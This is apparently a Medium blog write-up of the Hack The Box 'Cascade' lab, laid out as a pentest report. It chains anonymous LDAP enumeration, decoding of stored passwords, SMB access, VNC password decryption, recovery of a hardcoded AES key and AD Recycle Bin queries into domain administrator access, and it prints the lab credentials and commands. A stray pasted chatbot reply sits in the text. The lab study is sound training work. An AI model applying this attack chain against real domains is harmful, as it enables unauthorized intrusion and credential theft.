# Resurrecting the Dead:💀 Exploiting Active Directory’s Recycle Bin ♻️✝️

A full walkthrough on chaining 🚀 misconfigurations, decoding VNC, and using the AD Recycle Bin to get Root. 🖥️ Let’s dig in! ⚔️

---

### Resurrecting the Dead:💀 Exploiting Active Directory’s Recycle Bin ♻️✝️

#### A full walkthrough on chaining 🚀 misconfigurations, decoding VNC, and using the AD Recycle Bin to get Root. 🖥️ Let’s dig in! ⚔️

![](https://cdn-images-1.medium.com/max/800/1*IOFUbczm9HB8TwdQVs3tBA.png)

> <a href="https://medium.com/bugbountywriteup/resurrecting-the-dead-exploiting-active-directorys-recycle-bin-%EF%B8%8F-%EF%B8%8F-5558982fc5fa?sk=573dbe0bf2a492c8e5d73356dc515f71" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/resurrecting-the-dead-exploiting-active-directorys-recycle-bin-%EF%B8%8F-%EF%B8%8F-5558982fc5fa?sk=573dbe0bf2a492c8e5d73356dc515f71" target="_blank">**Not a Member?? Click Here to Read the Full-Story**</a>

### 1.0 Executive Summary

**Assessment Date:** *January 17, 2026* **Target:** *10.129.14.58 (CASC-DC1, CASCADE \[HTB\])* **Assessor:** *Nicholas Mullenski*

During the initial phase of the engagement, the target **`10.129.14.58`** was identified as a Domain Controller running **Windows Server 2008 R2 SP1**. The host is exposing several critical services typical of an Active Directory environment, including Kerberos, LDAP, and SMB. The presence of Windows Management Framework (WinRM) on port 5985 indicates that remote management is enabled, presenting a high-value vector for remote code execution if valid credentials are successfully compromised.

Understood. Using a nested hierarchy is much better for technical reporting as it groups related findings logically rather than listing them as disparate events.

Here is the revised section of your report, restructured with the **2.0, 2.1, 2.1.1** format to meet professional standards.

---

### 2.0 Technical Findings & Enumeration

#### **2.1 Network Service Enumeration**

**2.1.1 Port Scanning & Service Identification** **Tool Used:** Nmap (Network Mapper)

**Methodology:** A full TCP port scan was conducted to identify the attack surface. Default scripts (**`-sC`**) and version detection (**`-sV`**) were utilized to fingerprint running services.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cascade]
└─$ nmap -sC -sV -oN nmap_scan.txt 10.129.14.58
Starting Nmap 7.94 ( https://nmap.org ) at 2026-01-17 14:02 EST
Nmap scan report for 10.129.14.58
Host is up (0.042s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-17 19:02:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: CASCADE)
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.23 seconds
```

**Findings:** The target was identified as a Domain Controller running Windows Server 2008 R2 SP1. The following critical services were identified:

- <span id="95e2">**TCP 53 (DNS):** Primary name server for the **`cascade.local`** domain.</span>
- <span id="ad2f">**TCP 88 (Kerberos):** Confirming the host functions as a Key Distribution Center (KDC).</span>
- <span id="b25c">**TCP 389/636 (LDAP/S):** Directory services are exposed.</span>
- <span id="223e">**TCP 445 (SMB):** Microsoft-DS enabled, providing a vector for file sharing and authentication.</span>
- <span id="324c">**TCP 5985 (WinRM):** Windows Remote Management is active, indicating potential for remote shell access.</span>

![](https://cdn-images-1.medium.com/max/800/1*WkcjLQ-7IltRBSd5kaH1fA.png)

#### **2.2 Directory Service Analysis (LDAP)**

**2.2.1 Anonymous Bind Configuration** The Lightweight Directory Access Protocol (LDAP) service on port 389 is misconfigured to allow anonymous binding. This permits unauthenticated users to query the directory and retrieve structural information about the domain, including naming contexts and policy settings.

**2.2.2 Domain Security Policy** Enumeration of the domain object (**`DC=cascade,DC=local`**) revealed a critically weak security posture:

- <span id="26aa">**`lockoutThreshold: 0`**: The domain has no account lockout policy enabled, allowing for unrestricted brute-force attacks.</span>
- <span id="274d">**`minPwdLength: 5`**: The minimum password length is set to 5 characters, facilitating the use of weak passwords by users.</span>

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cascade]
└─$ ldapsearch -x -H ldap://10.129.14.58 -b "DC=cascade,DC=local" | grep -E "lockoutThreshold|minPwdLength"
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

lockoutThreshold: 0
minPwdLength: 5
```

**2.2.3 Account Enumeration** Leveraging the anonymous access, a filter for **`(objectClass=person)`** was applied to extract a list of valid user accounts. The following high-value targets were identified:

- <span id="61ca">**Service Accounts:** **`arksvc`,** **`BackupSvc`,** **`util`**</span>
- <span id="489b">**Standard Users:** **`r.thompson`,** **`s.smith`,** **`j.wakefield`**</span>

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cascade]
└─$ ldapsearch -x -H ldap://10.129.14.58 -b "DC=cascade,DC=local" "(sAMAccountName=r.thompson)"
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (sAMAccountName=r.thompson)
# requesting: ALL
#

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109153132.0Z
displayName: Ryan Thompson
uSNCreated: 16389
name: Ryan Thompson
objectGUID:: e8tL29s...
userAccountControl: 66048
sAMAccountName: r.thompson
userPrincipalName: r.thompson@cascade.local
cascadeLegacyPwd: clk0bjVldmE=
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132241582910000000

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cascade]
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

#### **2.3 Vulnerability Analysis:**

**Information Disclosure** **2.3.1 Sensitive Attribute Discovery** A detailed inspection of user attributes revealed a deviation from standard security practices. The user object **`CN=Ryan Thompson`** contained a custom attribute named **`cascadeLegacyPwd`**. This attribute appears to be a remnant of a legacy migration process.

**2.3.2 Credential Decoding** **Finding:** The **`cascadeLegacyPwd`** attribute contained the Base64 encoded string: **`clk0bjVldmE=`**. **Analysis:** Decoding this string resulted in the plaintext value **`rY4n5eva`**. **Risk:** The exposure of credentials in directory attributes allows any user with read access (including anonymous users in this configuration) to compromise the account.

#### **2.4 Initial Access & Exploitation**

**2.4.1 SMB Credential Validation** The recovered credentials (**`r.thompso`**`n` : **`rY4n5eva`**) were validated against the SMB service (Port 445). The account authenticated successfully.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cascade]
└─$ crackmapexec smb 10.129.14.58 -u r.thompson -p 'rY4n5eva' --shares
SMB         10.129.14.58    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.14.58    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.129.14.58    445    CASC-DC1         [+] Enumerated shares
SMB         10.129.14.58    445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.14.58    445    CASC-DC1         -----           -----------     ------
SMB         10.129.14.58    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.14.58    445    CASC-DC1         Audit$
SMB         10.129.14.58    445    CASC-DC1         C$                              Default share
SMB         10.129.14.58    445    CASC-DC1         Data            READ
SMB         10.129.14.58    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.14.58    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.129.14.58    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.14.58    445    CASC-DC1         SYSVOL          READ            Logon server share
```

**2.4.2 Share Enumeration** Post-authentication enumeration identified the available SMB shares. While administrative shares (**`C$`,** **`ADMIN$`**) were restricted, the user **`r.thompson`** possesses **READ** permissions to a non-default share named **`Data`**. This share represents the primary vector for lateral movement.

### 2.5 Internal Information Enumeration

**2.5.1 SMB Share Analysis** Following the identification of READ permissions on the **`Data`** share, a recursive directory listing was performed. The share contained a departmental folder structure (**`Contractors`,** **`Finance`,** **`IT`,** **`Production`,** **`Temps`**). Access Control Lists (ACLs) correctly restricted access to most folders; however, the **`IT`** directory was misconfigured, allowing the **`r.thompson`** user to traverse the directory.

![](https://cdn-images-1.medium.com/max/800/1*UKpcp5mHgAJ8AqRROBnehQ.png)

**2.5.2 Sensitive Artifact Discovery** A manual review of files within the **`\IT\`** directory revealed two critical artifacts:

1.  <span id="595e">**VNC Install.reg:** Located in `\IT\Temp\s.smith\`, this registry file contained a hex-encoded password configuration for TightVNC. The file path strongly associates these credentials with the user **`s.smith`**.</span>
2.  <span id="3f1b">**Meeting_Notes_June_2018.html:** Located in **`\IT\Email Archives\`**, this email correspondence discussed a "TempAdmin" account used for migration. The email explicitly stated that the "TempAdmin" password was identical to the Domain Administrator password and that the account would be deleted post-migration.</span>

![](https://cdn-images-1.medium.com/max/800/1*7OZkf8uzPQXvbV5PRw7l0A.png)

### 2.6 Lateral Movement

**2.6.1 Credential Decryption (s.smith)** The VNC password string (**`hex:6b,cf...`**) was extracted from the registry file. Using a custom decryption script implementing the VNC DES algorithm, the plaintext password was recovered.

- <span id="9206">**User:** **`cascade.local\s.smith`**</span>
- <span id="d64f">**Password:** **`sT333ve2`**</span>

![](https://cdn-images-1.medium.com/max/800/1*_Y-V9ae-JGFLRwUz7fWH3w.png)

**2.6.2 User Validation** The recovered credentials were validated against the Domain Controller using **`crackmapexec`**. The user **`s.smith`** was confirmed to be valid and active.

### 2.7 Privilege Escalation: Service Account Compromise

**2.7.1 Network Share Pivoting** Using the compromised **`s.smith`** credentials, further enumeration of SMB shares was conducted. The user possessed access to a restricted share named **`Audit$`**. This share contained the installation files for "CascAudit," a custom auditing application.

**2.7.2 Application Reverse Engineering** The application consisted of an executable (**`CascAudit.exe`**), a cryptographic library (**`CascCrypto.dll`**), and an encrypted SQLite database (**`Audit.db`**). Static analysis was performed on the binaries to understand the encryption mechanism.

- <span id="2201">**Methodology:** The **`strings`** utility (with the **`-e l`** flag for Unicode support) was used to extract hardcoded cryptographic material.</span>
- <span id="8823">**Findings:** The developer improperly embedded the encryption keys directly into the compiled code.</span>
- <span id="33df">**AES Key (Found in .exe):** **`c4scadek3y654321`**</span>

![](https://cdn-images-1.medium.com/max/800/1*9mmVlNDtHW-U9m3KCB-k5A.png)

- <span id="1378">**Initialization Vector (Found in .dll):** **`1tdyjCbY1Ix49842`**</span>

![](https://cdn-images-1.medium.com/max/800/1*xLBUSb6AA7_-6YKBkVGM4A.png)

**2.7.3 Database Decryption** Using the recovered Key and IV, the password for the **`ArkSvc`** service account was decrypted from the **`Audit.db`** SQLite database.

- <span id="0839">**Service Account:** **`ArkSvc`**</span>
- <span id="6f19">**Decrypted Password:** **`w3lc0meFr31nd`**</span>

![](https://cdn-images-1.medium.com/max/800/1*hio6kfjUt3ngQRRw-eavbA.png)

### 2.8 Privilege Escalation: Domain Compromise

**2.8.1 Active Directory Recycle Bin Exploitation** The **`ArkSvc`** account was identified as a service account responsible for AD auditing. Consequently, it possessed the **`List Contents`** and **`Read Property`** permissions on the "Deleted Objects" container in Active Directory (the AD Recycle Bin).

**2.8.2 Object Recovery** Leveraging the intelligence gathered in Section 2.5.2 (regarding the deleted **`TempAdmin`** account), an LDAP query was executed using the **`ArkSvc`** credentials. The query utilized the specific LDAP Control OID **`1.2.840.113556.1.4.417`** to force the server to reveal deleted objects.

![](https://cdn-images-1.medium.com/max/800/1*TV-KTS3-VnMuyq_36qsEqQ.png)

**2.8.3 Domain Administrator Recovery** The query successfully returned the **`TempAdmin`** object, which retained the custom **`cascadeLegacyPwd`** attribute despite deletion.

- <span id="1f65">**Recovered Attribute:** **`YmFDVDNyMWFOMDBkbGVz`**</span>
- <span id="a7c8">**Decoded Credential:** **`baCT3r1aN00dles`**</span>

As noted in the internal email, this password was reused for the built-in Administrator account. Access was verified via WinRM (**`evil-winrm`**), confirming complete domain compromise.

![](https://cdn-images-1.medium.com/max/800/1*phfaw_-2X8d1M418x9fuvA.png)

- <span id="4645">Collect Flags.. user & root.</span>

![](https://cdn-images-1.medium.com/max/800/1*wOtVNwai71bfAO5Biu54Iw.png)

![](https://cdn-images-1.medium.com/max/800/1*5vT0Cj-amW26Qs0_MBbbzw.png)

![](https://cdn-images-1.medium.com/max/800/1*-PdDY2B0rIlEW03LawSY6A.png)

### Red Team Mandate 🛡️

**Operation Cascade: The Persistence of Data**

“Our mandate as the Red Team is to challenge the assumption of deletion. In a digital environment, ‘gone’ is rarely ‘erased.’ We operate under the principle that every action leaves a residue — whether it is a hardcoded key in a compiled binary or a legacy attribute in a deleted directory object. Our objective is not merely to break in, but to demonstrate how the ghosts of past configurations can be resurrected to compromise the present security posture. We prove that security is not a state of being, but a continuous process of sanitization and vigilance.”

### 🕊️ The Spiritual Tie-In 📜

> *“For there is nothing hidden that will not be disclosed, and nothing concealed that will not be known or brought out into the open.”* — **Luke 8:17**

**The Connection:** “In the Cascade lab, the administrators believed they had secured the network by deleting the **`TempAdmin`** account. They thought the risk was buried. But as Luke 8:17 reminds us, nothing is truly concealed forever.

Just as spiritual truth eventually comes to light, digital truth has a way of surfacing. The **`cascadeLegacyPwd`** attribute was hidden in the darkness of the Recycle Bin, but with the right tools and persistence, it was brought out into the open. This verse serves as a warning to defenders: you cannot simply hide your sins (or your bad security practices); you must cleanse them completely."

#### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="e7be">Is there a specific tool you wish existed?</span>
- <span id="769b">Is there a hacking concept you want me to learn and explain?</span>
- <span id="e9a5">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/8buAHtm2fK" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/8buAHtm2fK" title="https://discord.gg/8buAHtm2fK"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>Welcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…</em>discord.gg</a><a href="https://discord.gg/8buAHtm2fK" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="9784a322b4c4322c092dbd39583df8bb"></a>

<a href="https://github.com/R00t3dbyFa17h" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://github.com/R00t3dbyFa17h" title="https://github.com/R00t3dbyFa17h"><strong>R00t3dbyFa17h - Overview</strong><br />
<em>Offensive Security Researcher &amp; Tool Developer. Here to secure the digital world one endpoint at a time!! …</em>github.com</a><a href="https://github.com/R00t3dbyFa17h" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="3ee08a69482310c5660137f9d4af7614" data-thumbnail-img-id="0*N04ZvbkK4hFyY1EP" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*N04ZvbkK4hFyY1EP);"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 25, 2026](https://medium.com/p/5558982fc5fa).

<a href="https://medium.com/@nicholasmullenski/resurrecting-the-dead-exploiting-active-directorys-recycle-bin-%EF%B8%8F-%EF%B8%8F-5558982fc5fa" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
